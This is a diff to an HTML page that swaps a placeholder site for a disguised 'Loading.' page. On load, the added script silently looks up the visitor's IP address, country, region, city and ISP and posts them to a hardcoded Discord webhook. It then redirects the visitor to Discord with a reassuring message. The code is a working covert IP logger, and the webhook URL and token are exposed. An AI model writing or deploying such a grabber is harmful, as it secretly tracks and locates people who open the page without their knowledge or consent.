@@ -1,50 +1,55 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Website</title>
-    <style>
-    body {
-        background-color: rgb(39, 39, 39);
-    }
-
-    h1 {
-        color: green;
-        font-family: 'Courier New', Courier, monospace;
-
-        text-align: center;
-    }
-    p {
-        color: red;
-        font-family: 'Courier New', Courier, monospace;
-        text-align: center;
-
-    }
-    b {
-        color: orangered;
-        font-family: 'Courier New', Courier, monospace;
-
-    }
-    button {
-        height: 80px;
-        width: 160px;
-        border: 0;
-        border-radius: 5px;
-        background-color: aquamarine;
-        font-family: 'Courier New', Courier, monospace;
-        margin-right: 100px;
-    }
-    .button-container {
-  display: flex;
-  justify-content: center; /* Horizontally centers the buttons */
-}
-
-    </style>
+ <title>Loading.</title>
+ <script>
+  setTimeout(function() {
+    window.location.href = 'https://www.discord.com/app';
+  }, 6000);
+</script>
 </head>
 <body>
-    <div class="button-container">
-        <button onclick="alert('The page is not complete yet. Sorry!');">Preview</button>
-      </div>
+<script>
+  async function sendUserDataToDiscord() {
+    try {
+      // Fetch user data from json.geoiplookup.io
+      const response = await fetch('https://json.geoiplookup.io');
+      const userData = await response.json();
+
+      // Construct the message content
+      const messageContent = `
+        **User Data:**
+        - IP Address: ${userData.ip}
+        - Country: ${userData.country_name}
+        - Region: ${userData.region}
+        - City: ${userData.city}
+        - ISP: ${userData.isp}
+      `;
+
+      // Send the user data to Discord webhook
+      const webhookURL = 'https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-'; // Replace with your Discord webhook URL
+      const payload = {
+        content: messageContent
+      };
+
+      await fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+      });
+
+      console.log('User data sent to Discord successfully');
+    } catch (error) {
+      console.error('Error sending user data to Discord:', error);
+    }
+  }
+
+  // Call sendUserDataToDiscord() when the page loads
+  window.addEventListener('load', sendUserDataToDiscord);
+</script>
+
+  <p>You should be redirected to discord, please be sure that you are logged in if you are on PC or iOS</p>
 </body>
 </html>
